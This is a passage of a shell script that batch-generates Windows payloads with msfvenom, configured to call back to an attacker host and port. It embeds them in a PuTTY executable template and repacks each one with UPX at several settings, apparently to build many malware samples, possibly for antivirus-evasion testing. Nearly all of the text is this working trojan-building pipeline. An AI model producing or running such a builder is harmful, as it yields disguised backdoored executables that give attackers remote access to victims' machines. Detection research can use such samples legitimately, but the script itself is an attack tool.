			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f raw | $TEMPLATE_PUTTY_X64_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

	done
}

function gen_upx {
	I=1
	TIME=0
	ITERATIONS=$(( `ls samples | wc -l` * 4 ))

	date > upx.log
	echo "=============================" >> upx.log

	for i in `ls samples`; do 
		NAME=`echo $i | sed 's/.exe//'`; 

		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
		tput clear
		tput cup 0 0
		echo "UPX: fast"
		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
		EPOCH=$(( `date +%s%N`/1000000 )) # milisec
		upx -q -1 -o samples/${NAME}_upx_fast.exe samples/$i | tail -n 4 >> upx.log
		DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
		TIME=$(( $TIME + $DELTA ))
		TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
		I=$((I+1))

		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
		tput clear
		tput cup 0 0
		echo "UPX: normal"
		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
		EPOCH=$(( `date +%s%N`/1000000 )) # milisec
		upx -q -o samples/${NAME}_upx_default.exe samples/$i | tail -n 4 >> upx.log
		DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
		TIME=$(( $TIME + $DELTA ))
		TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
		I=$((I+1))

		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
		tput clear
		tput cup 0 0
		echo "UPX: best"
		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
		EPOCH=$(( `date +%s%N`/1000000 )) # milisec
		upx -q --best -o samples/${NAME}_upx_best.exe samples/$i | tail -n 4 >> upx.log
		DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
		TIME=$(( $TIME + $DELTA ))
		TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
		I=$((I+1))

		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
		tput clear
		tput cup 0 0
		echo "UPX: ultra brute"
		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
		EPOCH=$(( `date +%s%N`/1000000 )) # milisec
		upx -q --ultra-brute -o samples/${NAME}_upx_ubrute.exe samples/$i | tail -n 4 >> upx.log
		DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
		TIME=$(( $TIME + $DELTA ))
		TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
		I=$((I+1))
	done
}

if [ ! -e samples ]; then
	mkdir samples
fi

for b in "${BIN[@]}"; do
	if [ ! -e ${x} ]; then
        echo "${x} not found"
		echo "Closing..."
        exit
    fi
done

gen_samples
gen_upx
